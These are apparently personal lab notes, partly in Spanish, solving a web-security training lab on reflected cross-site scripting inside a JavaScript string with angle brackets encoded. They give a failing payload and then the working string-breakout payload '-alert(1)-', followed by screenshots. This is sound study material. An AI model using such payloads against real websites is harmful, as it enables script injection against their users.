# 09 Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

```jsx
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
```

![image.png](09%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%2017efab5460ec81228957c4d57c676914/image.png)

```jsx
"-alert(1)-"
Vemos que nos bloquea, por que el termino de busqueda está dentro de '
```

![image.png](09%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%2017efab5460ec81228957c4d57c676914/image%201.png)

```jsx
'-alert(1)-'
```

![image.png](09%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%2017efab5460ec81228957c4d57c676914/image%202.png)

![image.png](09%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%2017efab5460ec81228957c4d57c676914/image%203.png)

![image.png](09%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%2017efab5460ec81228957c4d57c676914/image%204.png)